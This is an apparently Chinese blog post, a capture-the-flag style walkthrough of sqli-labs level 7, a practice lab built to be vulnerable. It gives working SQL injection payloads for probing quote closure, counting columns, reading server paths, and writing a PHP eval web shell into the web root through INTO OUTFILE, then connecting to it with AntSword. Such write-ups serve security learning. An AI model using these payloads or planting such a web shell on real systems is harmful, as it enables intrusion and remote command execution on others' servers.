<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>sqli-labs第七关 - 菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="sqli-labs第七关" />
<meta property="og:description" content="第一步，判断注入点
?id=1
?id=1&#39;
?id=1&#34;
?id=1&#39;)
?id=1&#34;)
?id=1&#39;))
可以看到，存在注入点，且为字符型注入，单引号括号括号闭合
第二步，判断字段数
?id=1&#39;)) order by 3 --&#43;
?id=1&#39;)) order by 4 --&#43;
页面正常，可判断字段数为3
页面报错，可判断字段数不为4、
第三步：判断回显位
页面无回显，根据页面的提示“use outfile”,判断需要写入文件 才能过关
?id=-1&#39;)) union select 1,@@basedir,@@datadir --&#43;
@@datadir 读取数据库路径
@@basedir MYSQL 获取安装路径
通过语句可以查看目录路径地址
提示使用outfile
load_file()读取文件
前提：1、用户权限足够高，尽量具有root权限。2、secure_file_priv不为NULL
into outfile() 写入文件
需要mysql数据库开启secure-file-priv写文件权限，否则不能写入文件。
可以用命令窗口看一下MYSQL的权限,先进入MYSQL
show variables lilke &#39;%secure%&#39; ;
如果使用的是phpstudy，进入mysql安装目录，
我的目录是D:\LeStoreDownload\phpStudyjiayou\phpstudy_pro\Extensions\MySQL5.7.26
进入目录，找到my.ini 修改里面的secure-file-priv参数
如果没有secure_file_priv这个选项，直接添加即可。
?id=-1&#39;)) union select 1,2,&#39;&lt;?php @eval($_POST[&#34;cmd&#34;]);?&gt;&#39; into outfile &#34;D:\\LeStoreDownload\\phpStudyjiayou\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\1.php&#34; --&#43; 这里的路径必须用\\
向 目标路径 进行写入一个名为eval的php一句话木马，意思是打开命令行
虽然页面报错，但是在目标路径下可以看到写入的的1.php文件
用蚁剑进行连接：" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://cainiaoprogram.github.io/posts/fd90cddfbc9e1f128a4cb0b69b2e05e0/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-05-08T21:38:31+08:00" />
<meta property="article:modified_time" content="2023-05-08T21:38:31+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">sqli-labs第七关</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <p>第一步，判断注入点</p> 
<p>?id=1</p> 
<p>?id=1'</p> 
<p>?id=1"</p> 
<p>?id=1')</p> 
<p>?id=1")</p> 
<p>?id=1'))</p> 
<p><img alt="" height="1182" src="https://images2.imgbox.com/ec/73/bmWELr9p_o.png" width="1200"></p> 
<p>可以看到，存在注入点，且为字符型注入，单引号括号括号闭合</p> 
<p>第二步，判断字段数</p> 
<p>?id=1')) order by 3 --+</p> 
<p>?id=1')) order by 4 --+</p> 
<p><img alt="" height="1182" src="https://images2.imgbox.com/c0/bf/sdmxXP5h_o.png" width="1200"></p> 
<p> 页面正常，可判断字段数为3</p> 
<p><img alt="" height="1182" src="https://images2.imgbox.com/cd/ea/ewyoC6xv_o.png" width="1200"></p> 
<p> 页面报错，可判断字段数不为4、</p> 
<p>第三步：判断回显位</p> 
<p><img alt="" height="1182" src="https://images2.imgbox.com/29/77/0Bp1Vnar_o.png" width="1200"></p> 
<p> 页面无回显，根据页面的提示“use outfile”,判断需要写入文件 才能过关</p> 
<p></p> 
<p></p> 
<p></p> 
<p>?id=-1')) union select 1,@@basedir,@@datadir --+<br> @@datadir 读取数据库路径<br> @@basedir MYSQL 获取安装路径<br> 通过语句可以查看目录路径地址</p> 
<p><img alt="" height="1182" src="https://images2.imgbox.com/65/42/jLVJHfo7_o.png" width="1200"></p> 
<p></p> 
<p><img alt="" height="1182" src="https://images2.imgbox.com/73/c7/PjA5kCES_o.png" width="1200"></p> 
<p>提示使用outfile<br> load_file()读取文件<br> 前提：1、用户权限足够高，尽量具有root权限。2、secure_file_priv不为NULL<br> into outfile() 写入文件</p> 
<p>需要mysql数据库开启secure-file-priv写文件权限，否则不能写入文件。</p> 
<p>可以用命令窗口看一下MYSQL的权限,先进入MYSQL</p> 
<p>show variables lilke '%secure%' ;</p> 
<p><img alt="" height="851" src="https://images2.imgbox.com/51/ac/q3G68t3N_o.png" width="1200"></p> 
<p></p> 
<p>如果使用的是phpstudy，进入mysql安装目录，</p> 
<p>我的目录是D:\LeStoreDownload\phpStudyjiayou\phpstudy_pro\Extensions\MySQL5.7.26</p> 
<p>进入目录，找到my.ini 修改里面的secure-file-priv参数</p> 
<p>如果没有secure_file_priv这个选项，直接添加即可。<br><img alt="" height="1200" src="https://images2.imgbox.com/6b/08/SWKWyFJ5_o.png" width="1200"></p> 
<p></p> 
<p>?id=-1')) union select 1,2,'&lt;?php @eval($_POST["cmd"]);?&gt;' into outfile "D:\\LeStoreDownload\\phpStudyjiayou\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\1.php" --+  这里的路径必须用\\</p> 
<p>向 目标路径 进行写入一个名为eval的php一句话木马，意思是打开命令行</p> 
<p><img alt="" height="1182" src="https://images2.imgbox.com/d2/63/8qkKmdGN_o.png" width="1200"></p> 
<p>虽然页面报错，但是在目标路径下可以看到写入的的1.php文件</p> 
<p><img alt="" height="847" src="https://images2.imgbox.com/d8/72/qkCXXplh_o.png" width="1200"></p> 
<p> 用蚁剑进行连接：</p> 
<p>先添加数据：右键，添加数据</p> 
<p><img alt="" height="1049" src="https://images2.imgbox.com/4c/26/EFkxyibt_o.png" width="1200"></p> 
<p> 填入网址，并点“测试连接”<img alt="" height="963" src="https://images2.imgbox.com/fd/77/FWLbZSVb_o.png" width="1200"></p> 
<p>测试正常，点击“添加”</p> 
<p><img alt="" height="963" src="https://images2.imgbox.com/58/d8/LBLrHa2F_o.png" width="1200"></p> 
<p> 双击URL，打开文件管理<img alt="" height="1049" src="https://images2.imgbox.com/85/a0/XVXDUXsB_o.png" width="1200"></p> 
<p></p> 
<p> 可以看到我们写的1.php脚本文件，双击打开1.php连接成功！<img alt="" height="1049" src="https://images2.imgbox.com/ff/db/3SwnTYRg_o.png" width="1200"></p> 
<p> 至此，第七关就结束了！！！</p> 
<p><img alt="" height="3" src="https://images2.imgbox.com/74/43/PyPjCgQu_o.png" width="3"></p> 
<p></p> 
<p><img alt="" height="3" src="https://images2.imgbox.com/61/6f/3Ysdgkx7_o.png" width="3"></p> 
<p></p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/e0c595a12d81bdf7c7db9de29ecd6d3c/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">Java数组细节</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/22c24b84fe95a3a799dac43b0051dfca/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">python：numpy库中50个常用的函数</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>